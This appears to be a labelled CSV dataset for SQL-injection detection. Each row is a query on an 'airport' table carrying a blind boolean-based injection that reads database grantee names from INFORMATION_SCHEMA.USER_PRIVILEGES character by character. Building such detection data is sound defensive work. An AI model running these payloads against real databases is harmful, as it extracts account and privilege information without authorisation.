full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>32",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>48",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>120",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>120",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>108",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>116",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>124",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>40",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>110",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>114",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>122",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>36",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),2,1))>109",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),4,1))>115",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),3,1))>121",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>38",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),1,1))>39",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>48",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>120",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>36",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>108",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>116",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>42",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>108",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>106",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>45",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>114",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>106",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),6,1))>107",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),7,1))>46",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),5,1))>113",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),8,1))>105",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),9,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),10,1))>64",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),11,1))>64",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),9,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),11,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),10,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),12,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),9,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),11,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),12,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),10,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),9,1))>108",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),11,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),12,1))>120",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),11,1))>108",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),10,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),9,1))>110",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),11,1))>110",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),12,1))>116",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),10,1))>100",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),11,1))>111",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),9,1))>109",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),12,1))>114",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),10,1))>102",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),14,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),13,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),12,1))>115",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),10,1))>101",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),14,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),13,1))>112",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),16,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),15,1))>96",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),14,1))>104",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24 OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 0,1) AS baii),16,1))>112",1,airport-S2,Unknown,Unknown
